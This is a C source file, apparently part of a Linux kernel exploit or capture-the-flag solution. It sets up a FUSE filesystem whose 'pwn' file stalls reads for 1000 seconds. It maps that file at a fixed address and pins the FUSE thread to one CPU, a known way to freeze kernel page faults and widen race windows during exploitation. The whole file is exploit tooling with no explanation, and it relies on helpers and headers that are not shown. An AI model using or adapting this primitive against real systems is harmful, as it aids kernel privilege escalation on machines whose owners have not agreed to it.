#define FUSE_USE_VERSION 34
#include <linux/fuse.h>
#include <fuse.h>
#include <errno.h>
#include <sched.h>
#include <sys/mman.h>
#define FUSE_MEM_ADDR 0xdeadbeef000

static int getattr_callback(const char *path, struct stat *stbuf)
{
    memset(stbuf, 0, sizeof(struct stat));

    if (strcmp(path, "/pwn") == 0)
    {
        stbuf->st_mode = S_IFREG | 0777;
        stbuf->st_nlink = 1;
        stbuf->st_size = 0x1000;
        return 0;
    }

    return -ENOENT;
}

static int open_callback(const char *path, struct fuse_file_info *fi)
{
    return 0;
}

static int fault_cnt = 0;
static int read_callback(const char *path, char *buf, size_t size, off_t offset,
                         struct fuse_file_info *fi)
{

    char signal;
    if (strcmp(path, "/pwn") == 0)
    {
        ++fault_cnt;
        if (fault_cnt < 0x10000)
        {
            sleep(1000);
            return 0;
        }
        else
        {
            printf("%d\n", fault_cnt);
            return 0;
        }
    }

    return -ENOENT;
}

static struct fuse_operations fops = {
    .getattr = getattr_callback,
    .open = open_callback,
    .read = read_callback,
};

int setup_done = 0;
cpu_set_t pwn_cpu;

void *fuse_thread(void *_arg)
{
    struct fuse_args args = FUSE_ARGS_INIT(0, NULL);
    struct fuse_chan *chan;
    struct fuse *fuse;

    if (mkdir("/tmp/test", 0777))
        panic("mkdir(\"/tmp/test\")");

    if (!(chan = fuse_mount("/tmp/test", &args)))
        panic("fuse_mount");

    if (!(fuse = fuse_new(chan, &args, &fops, sizeof(fops), NULL)))
    {
        fuse_unmount("/tmp/test", chan);
        panic("fuse_new");
    }

    if (sched_setaffinity(getpid(), sizeof(cpu_set_t), &pwn_cpu))
        panic("sched_setaffinity");

    fuse_set_signal_handlers(fuse_get_session(fuse));
    setup_done = 1;
    fuse_loop_mt(fuse);

    fuse_unmount("/tmp/test", chan);
    return NULL;
}
int pwn_fd = -1;
void *mmap_fuse_file(void)
{
    if (pwn_fd != -1)
        close(pwn_fd);
    pwn_fd = open("/tmp/test/pwn", O_RDWR);
    if (pwn_fd == -1)
        panic("/tmp/test/pwn");

    void *page;
    page = mmap(FUSE_MEM_ADDR, 0x1000, PROT_READ | PROT_WRITE,
                MAP_PRIVATE, pwn_fd, 0);
    if (page == MAP_FAILED)
        panic("mmap");
    return page;
}
void * initFuse(void ){
    CPU_ZERO(&pwn_cpu);
    CPU_SET(0, &pwn_cpu);
    pthread_t th;
    pthread_create(&th, NULL, fuse_thread, NULL);
    while (!setup_done);
    return mmap_fuse_file();
}
